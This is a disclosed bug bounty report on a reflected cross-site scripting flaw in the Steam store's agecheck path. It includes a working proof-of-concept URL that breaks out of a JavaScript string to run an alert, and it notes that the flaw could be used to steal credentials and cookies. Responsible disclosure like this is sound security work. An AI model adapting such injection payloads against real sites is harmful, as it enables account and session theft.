# XSS @ store.steampowered.com via agecheck path name

## Report Details
- **Report ID**: 406704
- **URL**: https://hackerone.com/reports/406704
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-09-07T09:15:52.056Z
- **Disclosed**: 2019-01-07T20:11:49.328Z

## Reporter
- **Username**: tvmpt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: valve

## Vulnerability Information
Hi,

I found a Cross-Site Scripting (XSS) in store.steampowered.com because the path after /agecheck/ is not sanitized as it should.

```
https://store.steampowered.com/agecheck/appmhuh2',{ sessionid: g_sessionID, ageDay: '', ageMonth: '', ageYear: '' } ).done( function( response ) { }%20 );}alert`XSS-by-TvM`;function x(){$J.post('mr2n2/247660/
```

Open this^ link, and XSS will be executed! Tested on FF 61.0.2

Looking forward!

Best regards,
Pedro

## Impact

A cross-site scripting vulnerability allows an attacker to modify the page. The attacker can inject forms to steal usernames, passwords, cookies,etc. In short, XSS opens the doors to plenty of phishing techniques.

## Attachments
- store.steampowered.com_agecheck_url.mp4
